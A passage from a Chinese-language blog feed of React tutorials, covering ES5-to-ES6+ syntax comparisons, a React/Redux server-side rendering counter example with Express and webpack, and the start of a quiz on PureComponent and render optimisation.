在 ES6+ 中我們則是參考 ES7 property initializers 使用 class 中的靜態屬性（static properties）來定義：
class Todo extends React.Component &#123;  static defaultProps = &#123;    checked: false,    maxLength: 10,  &#125;; // 注意有分號  static propTypes = &#123;    checked: React.PropTypes.bool.isRequired,    maxLength: React.PropTypes.number.isRequired  &#125;;  render() &#123;  	return();  &#125;&#125;

ES6+ 另外一種寫法，可以留意一下，主要是看各團隊喜好和規範，選擇合適的方式：
class Todo extends React.Component &#123;    render() &#123;        return (            &lt;View /&gt;        );    &#125;&#125;Todo.defaultProps = &#123;    checked: false,    maxLength: 10,&#125;;Todo.propTypes = &#123;    checked: React.PropTypes.bool.isRequired,    maxLength: React.PropTypes.number.isRequired,&#125;;


5. State在 React 中 Props 和 State 是資料流傳遞的重要元素，不同的是 state 可更動，可以去執行一些運算。在 ES5 中我們使用 getInitialState  去初始化 state： 
var Todo = React.createClass(&#123;    getInitialState: function() &#123;        return &#123;            maxLength: this.props.maxLength,        &#125;;    &#125;,&#125;);

在 ES6+ 中我們初始化 state 有兩種寫法：
class Todo extends React.Component &#123;    state = &#123;        maxLength: this.props.maxLength,    &#125;&#125;

另外一種寫法，使用在建構式初始化。比較推薦使用這種方式，方便做一些運算：
class Todo extends React.Component &#123;    constructor(props)&#123;        super(props);        this.state = &#123;            maxLength: this.props.maxLength,        &#125;;    &#125;&#125;


6. Arrow functions在講 Arrow functions 之前，我們先聊聊在 React 中 this 和它所代表的 context。在 ES5 中，我們使用 React.createClass() 來建立 Component，而在 React.createClass() 下，預設幫你綁定好 method 的 this，你毋須自行綁定。所以你可以看到像是下面的例子，callback function handleButtonClick 中的  this 是指到 component 的實例（instance），而非觸發事件的物件：
var TodoBtn = React.createClass(&#123;    handleButtonClick: function(e) &#123;        // 此 this 指到 component 的實例（instance），而非 button        this.setState(&#123;showOptionsModal: true&#125;);    &#125;,    render: function()&#123;        return (            &lt;div&gt;                &lt;Button onClick=&#123;this.handleButtonClick&#125;&gt;&#123;this.props.label&#125;&lt;/Button&gt;            &lt;/div&gt;        )    &#125;,&#125;);

然而自動綁定這種方式反而會讓人容易誤解，所以在 ES6+ 推薦使用 bind  綁定 this 或使用 Arrow functions（它會绑定當前 scope 的 this context）兩種方式，你可以參考下面例子：
class TodoBtn extends React.Component&#123;    handleButtonClick(e)&#123;        // 確認綁定 this 指到 component instance        this.setState(&#123;toggle: true&#125;);    &#125;    render()&#123;        // 這邊可以用 this.handleButtonClick.bind(this) 手動綁定或是 Arrow functions () =&gt; &#123;&#125; 用法        return (            &lt;div&gt;                &lt;Button onClick=&#123;this.handleButtonClick.bind(this)&#125; onClick=&#123;(e)=&gt; &#123;this.handleButtonClick(e)&#125; &#125;&gt;&#123;this.props.label&#125;&lt;/Button&gt;            &lt;/div&gt;        )    &#125;,&#125;

Arrow functions 雖然一開始看起來有點怪異，但其實觀念很簡單：一個簡化的函數。函數基本上就是參數（不一定要有參數）、表達式、回傳值（也可能是回傳 undefined）：
// Arrow functions 的一些例子()=&gt;7e=&gt;e+2()=&gt;&#123;    alert(&#x27;XD&#x27;);&#125;(a,b)=&gt;a+be=&gt;&#123;    if (e == 2)&#123;        return 2;    &#125;    return 100/e;&#125;

不過要注意的是無論是 bind 或是 Arrow functions，每次執行回傳都是指到一個新的函數，若需要再調用到這個函數，請記得先把它存起來：
錯誤用法：
class TodoBtn extends React.Component&#123;    componentWillMount()&#123;        Btn.addEventListener(&#x27;click&#x27;, this.handleButtonClick.bind(this));    &#125;    componentDidmount()&#123;        Btn.removeEventListener(&#x27;click&#x27;, this.handleButtonClick.bind(this));    &#125;    onAppPaused(event)&#123;    &#125;&#125;

正確用法：
class TodoBtn extends React.Component&#123;    constructor(props)&#123;        super(props);        this.handleButtonClick = this.handleButtonClick.bind(this);    &#125;    componentWillMount()&#123;        Btn.addEventListener(&#x27;click&#x27;, this.handleButtonClick);    &#125;    componentDidmount()&#123;        Btn.removeEventListener(&#x27;click&#x27;, this.handleButtonClick);    &#125;&#125;

更多 Arrows and Lexical This 特性可以參考這個文件。
7. Dynamic property names &amp; template strings以前在 ES5 我們要動態設定屬性名稱時，往往需要多寫幾行程式碼才能達到目標：
var Todo = React.createClass(&#123;  onChange: function(inputName, e) &#123;    var stateToSet = &#123;&#125;;    stateToSet[inputName + &#x27;Value&#x27;] = e.target.value;    this.setState(stateToSet);  &#125;,&#125;);

但在 ES6+中，透過 enhancements to object literals 和 template strings 可以輕鬆完成動態設定屬性名稱的任務：
class Todo extends React.Component &#123;  onChange(inputName, e) &#123;    this.setState(&#123;      [`$&#123;inputName&#125;Value`]: e.target.value,    &#125;);  &#125;&#125;

Template Strings 是一種語法糖（syntactic sugar），方便我們組織字串（這邊也用上 let、const 變數和常數宣告的方式，和 var 的 function scope 不同的是它們是屬於 block scope，亦即生存域存在於 &#123;&#125; 間）：
// Interpolate variable bindingsconst name = &quot;Bob&quot;, let = &quot;today&quot;;`Hello $&#123;name&#125;, how are you $&#123;time&#125;?` \\ Hello Bob, how are you today?


8. Destructuring &amp; spread attributes在 React 的 Component 中，父元件利用 props 來傳遞資料到子元件是常見作法，然而我們有時會希望只傳遞部分資料，此時 ES6+ 中的 Destructuring 和 JSX 的 Spread Attributes
 ，... Spread Attributes 主要是用來迭代物件：
class Todo extends React.Component &#123;  render() &#123;    var &#123;      className,      ...others,  // ...others 包含 this.props 除了 className 外所有值。this.props = &#123;value: &#x27;true&#x27;, title: &#x27;header&#x27;, className: &#x27;content&#x27;&#125;    &#125; = this.props;    return (      &lt;div className=&#123;className&#125;&gt;        &lt;TodoList &#123;...others&#125; /&gt;        &lt;button onClick=&#123;this.handleLoadMoreClick&#125;&gt;Load more&lt;/button&gt;      &lt;/div&gt;    );  &#125;&#125;

但使用上要注意的是若是有重複的屬性值則以後來覆蓋，下面的例子中若 ...this.props，有 className，則被後來的 main 所覆蓋：
&lt;div &#123;...this.props&#125; className=&quot;main&quot;&gt;  …&lt;/div&gt;

而 Destructuring 也可以用在簡化 Module 的引入上，這邊我們先用 ES5 中引入方式來看：
var React = require(&#x27;react-native&#x27;);var Component = React.component; class HelloWorld extends Component &#123;  render() &#123;    return (      &lt;View&gt;        &lt;Text&gt;Hello, world!&lt;/Text&gt;      &lt;/View&gt;    );  &#125;&#125; export default HelloWorld;

以下 ES5 寫法：
var React = require(&#x27;react-native&#x27;);var View = React.View;

在 ES6+ 則可以直接使用 Destructuring 這種簡化方式來引入模組中的元件：
// 這邊等於上面的寫法var &#123; View &#125; = require(&#x27;react-native&#x27;);

更進一步可以使用 import 語法：
import React, &#123;	View,	Component,	Text,&#125; from &#x27;react-native&#x27;;class HelloWorld extends Component &#123;  render() &#123;    return (      &lt;View&gt;        &lt;Text&gt;Hello, world!&lt;/Text&gt;      &lt;/View&gt;    );  &#125;&#125; export default HelloWorld;


9. Mixins在 ES5 中，我們可以使用 Mixins 的方式去讓不同的 Component 共用相似的功能，重用我們的程式碼：
var PureRenderMixin = require(&#x27;react-addons-pure-render-mixin&#x27;);React.createClass(&#123;  mixins: [PureRenderMixin],  render: function() &#123;    return &lt;div className=&#123;this.props.className&#125;&gt;foo&lt;/div&gt;;  &#125;&#125;);

但由於官方不打算在 ES6+ 中繼續推行 Mixins，若還是希望使用，可以參考看看第三方套件或是這個文件的用法。
10. Default Parameters以前 ES5 我們函數要使用預設值需要這樣使用：
var link = function (height, color) &#123;      var height = height || 50;      var color = color || &#x27;red&#x27;;  &#125;  

現在 ES6+ 的函數可以支援預設值，讓程式碼更為簡潔：
var link = function(height = 50, color = &#x27;red&#x27;) &#123;    ...  &#125; 

總結以上就是 React ES5、ES6+常見用法對照表，能看到這邊的你應該已經對於 React ES5、ES6 使用上有些認識，先給自己一些掌聲吧！確實從 ES6 開始，JavaScript 和以前我們看到的 JavaScript 有些不同，增加了許多新的特性，有些讀者甚至會很懷疑說這真的是 JavaScript 嗎？ES6 的用法對於初學者來說可能會需要寫一點時間吸收，下面我幫大家準備了延伸閱讀，方便大家進一步參考學習。接下來我們也會有一系列從零開始學 React 的文章來帶大家由淺入深學習 ReactJS 生態系，運用 JavaScript 打造跨平台應用程式。筆者才書學淺，若有疏漏歡迎大家一起交流討論：）
延伸閱讀
React&#x2F;React Native 的ES5 ES6写法对照表
React on ES6+
react native 中es6语法解析 
Learn ES2015
ECMAScript 6入门
React官方網站
React INTRO TO REACT.JS
React.createClass versus extends React.Component
react-native-coding-style
Airbnb React&#x2F;JSX Style Guide
從零開始學 React（ReactJS 101）

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校，目前專注在 Mobile 和 IoT 應用開發。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, React Native, ES5, ES6, ES7, JavaScript, ECMAScript2015, Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>一看就懂的 React Server Rendering（Isomorphic JavaScript）入門教學</title>
    <url>/2016/08/27/react-redux-immutablejs-node-server-isomorphic-tutorial/</url>
    <content><![CDATA[
前言由於可能有些讀者沒聽過 Isomorphic JavaScript 。因此在進到開發 React Redux Sever Rendering 應用程式的主題之前我們先來聊聊 Isomorphic JavaScript 這個議題。
根據 Isomorphic JavaScript 這個網站的說明：

Isomorphic JavaScript apps are JavaScript applications that can run both client-side and server-side.The backend and frontend share the same code. 

Isomorphic JavaScript 係指瀏覽器端和伺服器端共用 JavaScript 的程式碼。
另外，除了 Isomorphic JavaScript 外，讀者或許也有聽過 Universal JavaScript 這個用詞。那什麼是 Universal JavaScript 呢？它和 Isomorphic JavaScript 是指一樣的意思嗎？針對這個議題網路上有些開發者提出了自己的觀點： Universal JavaScript、Isomorphism vs Universal JavaScript。其中 Isomorphism vs Universal JavaScript 這篇文章的作者 Gert Hengeveld 指出 Isomorphic JavaScript 主要是指前後端共用 JavaScript 的開發方式，而 Universal JavaScript 是指 JavaScript 程式碼可以在不同環境下運行，這當然包含瀏覽器端和伺服器端，甚至其他環境。也就是說 Universal JavaScript 在意義上可以涵蓋的比 Isomorphic JavaScript 更廣泛一些，然而在 Github 或是許多技術討論上通常會把兩者視為同一件事情，這部份也請讀者留意。
Isomorphic JavaScript 的好處在開始真正撰寫 Isomorphic JavaScript 前我們在進一步探討使用 Isomorphic JavaScript 有哪些好處？在談好處之前，我們先看看最早 Web 開發是如何處理頁面渲染和 state 管理，還有遇到哪些挑戰。
最早的時候我們談論 Web 很單純，都是由 Server 端進行模版的處理，你可以想成 template 是一個函數，我們傳送資料進去，template 最後產生一張 HTML 給瀏覽器顯示。例如：Node 使用的（EJS、Jade）、Python&#x2F;Django 的 Template 或替代方案 Jinja、PHP 的 Smarty、Laravel 使用的 Blade，甚至是 Ruby on Rails 用的 ERB。都是由後端去 render 所有資料和頁面，前端處理相對單純。
然而隨著前端工程的軟體工程化和使用者體驗的要求，開始出現各式前端框架的百花齊放，例如：Backbone.js、Ember.js 和 Angular.js 等前端 MVC (Model-View-Controller) 或 MVVM (Model-View-ViewModel) 框架，將頁面於前端渲染的不刷頁單頁式應用程式（Single Page App）也因此開始流行。
後端除了提供初始的 HTML 外，還提供 API Server 讓前端框架可以取得資料用於前端 template。複雜的邏輯由 ViewModel&#x2F;Presenter 來處理，前端 template 只處理簡單的是否顯示或是元素迭代的狀況，如下圖所示：

然而前端渲染 template 雖然有它的好處但也遇到一些問題包括效能、SEO 等議題。此時我們就開始思考 Isomorphic JavaScript 的可能性：為什麼我們不能前後端都使用 JavaScript 甚至是 React？

事實上，React 的優勢就在於它可以很優雅地實現 Server Side Rendering 達到 Isomorphic JavaScript 的效果。在 react-dom/server 中有兩個方法 renderToString 和 renderToStaticMarkup 可以在 server 端渲染你的 components。其主要都是將 React Component 在 Server 端轉成 DOM String，也可以將 props 往下傳，然而事件處理會失效，要到 client-side 的 React 接收到後才會把它加上去（但要注意 server-side 和 client-side 的 checksum 要一致不然會出現錯誤），這樣一來可以提高渲染速度和 SEO 效果。renderToString 和 renderToStaticMarkup 最大的差異在於 renderToStaticMarkup 會少加一些 React 內部使用的 DOM 屬性，例如：data-react-id，因此可以節省一些資源。
使用 renderToString 進行 Server 端渲染：
import ReactDOMServer from &#x27;react-dom/server&#x27;;ReactDOMServer.renderToString(&lt;HelloButton name=&quot;Mark&quot; /&gt;);

渲染出來的效果：
&lt;button data-reactid=&quot;.7&quot; data-react-checksum=&quot;762752829&quot;&gt;  Hello, Mark&lt;/button&gt;

總的來說使用 Isomorphic JavaScript 會有以下的好處：

有助於 SEO
Rendering 速度較快，效能較佳
放棄蹩腳的 Template 語法擁抱 Component 元件化思考，便於維護
盡量前後端共用程式碼節省開發時間

不過要注意的是如果有使用 Redux 在 Server Side Rendering 中，其流程相對複雜，不過大致流程如下：由後端預先載入需要的 initialState，由於 Server 渲染必須全部都轉成 string，所以先將 state 先 dehydration（脫水），等到 client 端再 rehydration（覆水），重建 store 往下傳到前端的 React Component。
而要把資料從伺服器端傳遞到客戶端，我們需要：

把取得初始 state 當做參數並對每個請求建立一個全新的 Redux store 實體
選擇性地 dispatch 一些 action 
把 state 從 store 取出來
把 state 一起傳到客戶端

接下來我們就開始動手實作一個簡單的 React Server Side Rendering Counter 應用程式。
專案成果截圖
環境安裝與設定
安裝 Node 和 NPM

安裝所需套件
 $ npm install --save react react-dom redux react-redux react-router immutable redux-immutable redux-actions redux-thunk babel-polyfill babel-register body-parser express morgan qs

 $ npm install --save-dev babel-core babel-eslint babel-loader babel-preset-es2015 babel-preset-react babel-preset-stage-1 eslint eslint-config-airbnb eslint-loader eslint-plugin-import eslint-plugin-jsx-a11y eslint-plugin-react html-webpack-plugin webpack webpack-dev-server redux-logger

接下來我們先設定一下開發文檔。

設定 Babel 的設定檔： .babelrc
 &#123;	&quot;presets&quot;: [  	&quot;es2015&quot;,  	&quot;react&quot;, 	],	&quot;plugins&quot;: []&#125;

設定 ESLint 的設定檔和規則： .eslintrc
 &#123;  &quot;extends&quot;: &quot;airbnb&quot;,  &quot;rules&quot;: &#123;    &quot;react/jsx-filename-extension&quot;: [1, &#123; &quot;extensions&quot;: [&quot;.js&quot;, &quot;.jsx&quot;] &#125;],  &#125;,  &quot;env&quot; :&#123;    &quot;browser&quot;: true,  &#125;&#125;

設定 Webpack 設定檔： webpack.config.js
 // 讓你可以動態插入 bundle 好的 .js 檔到 .index.htmlconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);const HTMLWebpackPluginConfig = new HtmlWebpackPlugin(&#123;  template: `$&#123;__dirname&#125;/src/index.html`,  filename: &#x27;index.html&#x27;,  inject: &#x27;body&#x27;,&#125;);// entry 為進入點，output 為進行完 eslint、babel loader 轉譯後的檔案位置module.exports = &#123;  entry: [    &#x27;./src/index.js&#x27;,  ],  output: &#123;    path: `$&#123;__dirname&#125;/dist`,    filename: &#x27;index_bundle.js&#x27;,  &#125;,  module: &#123;    preLoaders: [      &#123;        test: /\.jsx$|\.js$/,        loader: &#x27;eslint-loader&#x27;,        include: `$&#123;__dirname&#125;/src`,        exclude: /bundle\.js$/      &#125;    ],    loaders: [&#123;      test: /\.js$/,      exclude: /node_modules/,      loader: &#x27;babel-loader&#x27;,      query: &#123;        presets: [&#x27;es2015&#x27;, &#x27;react&#x27;],      &#125;,    &#125;],  &#125;,  // 啟動開發測試用 server 設定（不能用在 production）  devServer: &#123;    inline: true,    port: 8008,  &#125;,  plugins: [HTMLWebpackPluginConfig],&#125;;

太好了！這樣我們就完成了開發環境的設定可以開始動手實作 React Server Side Rendering Counter 應用程式了！	
先看一下我們整個專案的資料結構，我們把整個專案分成三個主要的資料夾（client、server，還有共用程式碼的 common）：

動手實作首先，我們先定義了 client 的 index.js：
// 引用 babel-polyfill 避免瀏覽器不支援部分 ES6 用法import &#x27;babel-polyfill&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import &#123; Provider &#125; from &#x27;react-redux&#x27;;import CounterContainer from &#x27;../common/containers/CounterContainer&#x27;;import configureStore from &#x27;../common/store/configureStore&#x27;import &#123; fromJS &#125; from &#x27;immutable&#x27;;// 從 server 取得傳進來的 initialState。由於從字串轉回物件，又稱為 rehydration（覆水） const initialState = window.__PRELOADED_STATE__;// 由於我們使用 ImmutableJS，所以需要把在 server-side dehydration（脫水）又在前端 rehydration（覆水）的 initialState 轉成 ImmutableJS 資料型態，並傳進 configureStore 建立 storeconst store = configureStore(fromJS(initialState));// 接下來就跟一般的 React App 一樣，把 store 透過 Provider 往下傳到 Component 中ReactDOM.render(  &lt;Provider store=&#123;store&#125;&gt;    &lt;CounterContainer /&gt;  &lt;/Provider&gt;,  document.getElementById(&#x27;app&#x27;));

由於 Node 端要到新版對於 ES6 支援較好，所以先用 babel-register 在 src/server/index.js 去即時轉譯 server.js，但目前不建議在 production 環境使用。
// use babel-register to precompile ES6 syntaxrequire(&#x27;babel-register&#x27;);require(&#x27;./server&#x27;);

接著是我們 server 端，也是這個範例最重要的一個部分。首先我們用 express 建立了一個 port 為 3000 的 server，並使用 webpack 去執行 client 的程式碼。這個範例中我們使用了 handleRender 當 request 進來時（直接拜訪頁面或重新整理）就會執行 fetchCounter() 進行處理：
import Express from &#x27;express&#x27;;import qs from &#x27;qs&#x27;;import webpack from &#x27;webpack&#x27;;import webpackDevMiddleware from &#x27;webpack-dev-middleware&#x27;;import webpackHotMiddleware from &#x27;webpack-hot-middleware&#x27;;import webpackConfig from &#x27;../webpack.config&#x27;;import React from &#x27;react&#x27;;import &#123; renderToString &#125; from &#x27;react-dom/server&#x27;;import &#123; Provider &#125; from &#x27;react-redux&#x27;;import &#123; fromJS &#125; from &#x27;immutable&#x27;;import configureStore from &#x27;../common/store/configureStore&#x27;;import CounterContainer from &#x27;../common/containers/CounterContainer&#x27;;import &#123; fetchCounter &#125; from &#x27;../common/api/counter&#x27;;const app = new Express();const port = 3000;function handleRender(req, res) &#123;  // 模仿實際非同步 api 處理情形  fetchCounter(apiResult =&gt; &#123;  // 讀取 api 提供的資料（這邊我們 api 是用 setTimeout 進行模仿非同步狀況），若網址參數有值擇取值，若無則使用 api 提供的隨機值，若都沒有則取 0    const params = qs.parse(req.query);    const counter = parseInt(params.counter, 10) || apiResult || 0;    // 將 initialState 轉成 immutable 和符合 state 設計的格式     const initialState = fromJS(&#123;      counterReducers: &#123;        count: counter,      &#125;    &#125;);    // 建立一個 redux store    const store = configureStore(initialState);    // 使用 renderToString 將 component 轉為 string    const html = renderToString(      &lt;Provider store=&#123;store&#125;&gt;        &lt;CounterContainer /&gt;      &lt;/Provider&gt;    );    // 從建立的 redux store 中取得 initialState    const finalState = store.getState();    // 將 HTML 和 initialState 傳到 client-side    res.send(renderFullPage(html, finalState));  &#125;)&#125;// HTML Markup，同時也把 preloadedState 轉成字串（stringify）傳到 client-side，又稱為 dehydration（脫水）function renderFullPage(html, preloadedState) &#123;  return `    &lt;!doctype html&gt;    &lt;html&gt;      &lt;head&gt;        &lt;title&gt;Redux Universal Example&lt;/title&gt;      &lt;/head&gt;      &lt;body&gt;        &lt;div id=&quot;app&quot;&gt;$&#123;html&#125;&lt;/div&gt;        &lt;script&gt;          window.__PRELOADED_STATE__ = $&#123;JSON.stringify(preloadedState).replace(/&lt;/g, &#x27;\\x3c&#x27;)&#125;        &lt;/script&gt;        &lt;script src=&quot;/static/bundle.js&quot;&gt;&lt;/script&gt;      &lt;/body&gt;    &lt;/html&gt;    `&#125;// 使用 middleware 於 webpack 去進行 hot module reloading const compiler = webpack(webpackConfig);app.use(webpackDevMiddleware(compiler, &#123; noInfo: true, publicPath: webpackConfig.output.publicPath &#125;));app.use(webpackHotMiddleware(compiler));// 每次 server 接到 request 都會呼叫 handleRenderapp.use(handleRender);// 監聽 server 狀況app.listen(port, (error) =&gt; &#123;  if (error) &#123;    console.error(error)  &#125; else &#123;    console.info(`==&gt; 🌎  Listening on port $&#123;port&#125;. Open up http://localhost:$&#123;port&#125;/ in your browser.`)  &#125;&#125;);

處理完 Server 的部份接下來我們來處理 actions 的部份，在這個範例中 actions 相對簡單，主要就是新增和減少兩個行為，以下為 src/actions/counterActions.js：
import &#123; createAction &#125; from &#x27;redux-actions&#x27;;import &#123;  INCREMENT_COUNT,  DECREMENT_COUNT,&#125; from &#x27;../constants/actionTypes&#x27;;export const incrementCount = createAction(INCREMENT_COUNT);export const decrementCount = createAction(DECREMENT_COUNT);

以下為輸出常數 src/constants/actionTypes.js：
export const INCREMENT_COUNT = &#x27;INCREMENT_COUNT&#x27;;  export const DECREMENT_COUNT = &#x27;DECREMENT_COUNT&#x27;;  

在這個範例中我們使用 setTimeout() 來模擬非同步的產生資料讓 server 端在每次接收 request 時讀取隨機產生的值。實務上，我們會開 API 讓 Server 讀取初始要匯入的 initialState。
function getRandomInt(min, max) &#123;  return Math.floor(Math.random() * (max - min)) + min&#125;export function fetchCounter(callback) &#123;  setTimeout(() =&gt; &#123;    callback(getRandomInt(1, 100))  &#125;, 500)&#125;

談完 actions 我們來看我們的 reducers，在這個範例中 reducers 也是相對簡單的，主要就是針對新增和減少兩個行為去 set 值，以下是 src/reducers/counterReducers.js：
import &#123; fromJS &#125; from &#x27;immutable&#x27;;import &#123; handleActions &#125; from &#x27;redux-actions&#x27;;import &#123; CounterState &#125; from &#x27;../constants/models&#x27;;import &#123;  INCREMENT_COUNT,  DECREMENT_COUNT,&#125; from &#x27;../constants/actionTypes&#x27;;const counterReducers = handleActions(&#123;  INCREMENT_COUNT: (state) =&gt; (    state.set(      &#x27;count&#x27;,      state.get(&#x27;count&#x27;) + 1    )  ),  DECREMENT_COUNT: (state) =&gt; (    state.set(      &#x27;count&#x27;,      state.get(&#x27;count&#x27;) - 1    )  ),&#125;, CounterState);export default counterReducers;

準備好了 rootReducer 就可以使用 createStore 來創建我們 store，值得注意的是由於 configureStore 需要被 client-side 和 server-side 使用，所以把它輸出成 function 方便傳入 initialState 使用。以下是 src/store/configureStore.js：
import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;;import thunk from &#x27;redux-thunk&#x27;;import createLogger from &#x27;redux-logger&#x27;;import rootReducer from &#x27;../reducers&#x27;;export default function configureStore(preloadedState) &#123;  const store = createStore(    rootReducer,    preloadedState,    applyMiddleware(createLogger(&#123; stateTransformer: state =&gt; state.toJS() &#125;), thunk)  )  return store&#125;

最後來到了 components 和 containers 的時間，這次我們的 Component 主要有兩個按鈕讓使用者可以新增和減少數字並顯示目前數字。以下是 src/components/Counter/Counter.js：
import React, &#123; Component, PropTypes &#125; from &#x27;react&#x27;const Counter = (&#123;  count,  onIncrement,  onDecrement,&#125;) =&gt; (  &lt;p&gt;    Clicked: &#123;count&#125; times    &#123;&#x27; &#x27;&#125;    &lt;button onClick=&#123;onIncrement&#125;&gt;      +    &lt;/button&gt;    &#123;&#x27; &#x27;&#125;    &lt;button onClick=&#123;onDecrement&#125;&gt;      -    &lt;/button&gt;    &#123;&#x27; &#x27;&#125;  &lt;/p&gt;);// 注意要檢查 propTypes 和給定預設值Counter.propTypes = &#123;  count: PropTypes.number.isRequired,  onIncrement: PropTypes.func.isRequired,  onDecrement: PropTypes.func.isRequired&#125;Counter.defaultProps = &#123;  count: 0,  onIncrement: () =&gt; &#123;&#125;,  onDecrement: () =&gt; &#123;&#125;&#125;export default Counter;

最後把取出的 count  和事件處理方法用 connect 傳到 Counter 就大功告成了！以下是 src/containers/CounterContainer/CounterContainer.js：
import &#x27;babel-polyfill&#x27;;import &#123; connect &#125; from &#x27;react-redux&#x27;;import Counter from &#x27;../../components/Counter&#x27;;import &#123;  incrementCount,  decrementCount,&#125; from &#x27;../../actions&#x27;;export default connect(  (state) =&gt; (&#123;    count: state.get(&#x27;counterReducers&#x27;).get(&#x27;count&#x27;),  &#125;),  (dispatch) =&gt; (&#123;     onIncrement: () =&gt; (      dispatch(incrementCount())    ),    onDecrement: () =&gt; (      dispatch(decrementCount())    ),  &#125;))(Counter);

若一切順利，在終端機打上 $ npm start，你將可以在瀏覽器的 http://localhost:3000 看到自己的成果！

總結本章闡述了 Web 頁面瀏覽的進程和 Isomorphic JavaScript 的優勢，並介紹了如何使用 React Redux 進行 Server Side Rendering 的應用程式設計。若想參考更進一步資料可以參考筆者撰寫的 React 入門教學書 《從零開始學 ReactJS》，相關範例程式碼可以參考這裡，若有任何問題或建議歡迎一起學習討論：）
延伸閱讀
DavidWells&#x2F;isomorphic-react-example
RickWong&#x2F;react-isomorphic-starterkit
Server-rendered React components in Rails
Our First Node.js App: Backbone on the Client and Server
Going Isomorphic with React
A service for server-side rendering your JavaScript views
Isomorphic JavaScript: The Future of Web Apps
React Router Server Rendering

（image via airbnb）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校，目前專注在 Mobile 和 IoT 應用開發。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, Redux, Server Rendering, Isomorphic, JavaScript, Node, Express, Universal JavaScript, Isomorphic JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>React 性能優化大挑戰：一次理解 Immutable data 跟 shouldComponentUpdate</title>
    <url>/2018/01/05/react-render-optimization/</url>
    <content><![CDATA[前陣子正在重構公司的專案，試了一些東西之後發現自己對於 React 的渲染機制其實不太了解，不太知道 render 什麼時候會被觸發。而後來我發現不只我這樣，其實還有滿多人對這整個機制不太熟悉，因此決定寫這篇來分享自己的心得。
其實不知道怎麼優化倒還好，更慘的事情是你自以為在優化，其實卻在拖慢效能，而根本的原因就是對 React 的整個機制還不夠熟。被「優化」過的 component 反而還變慢了！這個就嚴重了。
因此，這篇文章會涵蓋到下面幾個主題：

Component 跟 PureComponent 的差異
shouldComponentUpdate 的作用
React 的渲染機制
為什麼要用 Immutable data structures

為了判別你到底對以上這些理解多少，我們馬上進行幾個小測驗！有些有陷阱，請睜大眼睛看清楚啦！
React 小測驗第一題以下程式碼是個很簡單的網頁，就一個按鈕跟一個叫做Content的元件而已，而按鈕按下去之後會改變App這個 component 的 state。
class Content extends React.Component &#123;  render () &#123;    console.log(&#x27;render content!&#x27;);    return &lt;div&gt;Content&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  handleClick = () =&gt; &#123;    this.setState(&#123;      a: 1    &#125;)  &#125;  render() &#123;    console.log(&#x27;render App!&#x27;);    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content /&gt;      &lt;/div&gt;    );  &#125;&#125;  ReactDOM.render(  &lt;App /&gt;,  document.getElementById(&#x27;container&#x27;));

請問：當你按下按鈕之後，console 會輸出什麼？
A. 什麼都沒有（App 跟 Content 的 render function 都沒被執行到）B. 只有 render App!（只有 App 的 render function 被執行到）C. render App! 以及 render content!（兩者的 render function 都被執行到）
第二題以下程式碼也很簡單，分成三個元件：App、Table 跟 Row，由 App 傳遞 list 給 Table，Table 再用 map 把每一個 Row 都渲染出來。
class Row extends Component &#123;  render () &#123;    const &#123;item, style&#125; = this.props;    return (      &lt;tr style=&#123;style&#125;&gt;        &lt;td&gt;&#123;item.id&#125;&lt;/td&gt;      &lt;/tr&gt;    )  &#125;&#125;  class Table extends Component &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;  class App extends Component &#123;  state = &#123;    list: Array(10000).fill(0).map((val, index) =&gt; (&#123;id: index&#125;))  &#125;    handleClick = () =&gt; &#123;    this.setState(&#123;      otherState: 1    &#125;)  &#125;    render() &#123;    const &#123;list&#125; = this.state;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;change state!&lt;/button&gt;        &lt;Table list=&#123;list&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;

而這段程式碼的問題就在於按下按鈕之後，App的 render function 被觸發，然後Table的 render function 也被觸發，所以重新渲染了一次整個列表。
可是呢，我們點擊按鈕之後，list根本沒變，其實是不需要重新渲染的，所以聰明的小明把 Table 從 Component 變成 PureComponent，只要 state 跟 props 沒變就不會重新渲染，變成下面這樣：
class Table extends PureComponent &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;  // 不知道什麼是 PureComponent 的朋友，可以想成他自己幫你加了下面的 functionshouldComponentUpdate (nextProps, nextState) &#123;  return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState)&#125;

把 Table 從 Component 換成 PureComponent 之後，如果我們再做一次同樣的操作，也就是按下change state按鈕改變 App 的 state，這時候會提升效率嗎？
A. 會，在這情況下 PureComponent 會比 Component 有效率B. 不會，兩者差不多C. 不會，在這情況下 Component 會比 PureComponent 有效率
第三題接著讓我來看一個跟上一題很像的例子，只是這次換成按按鈕以後會改變 list：
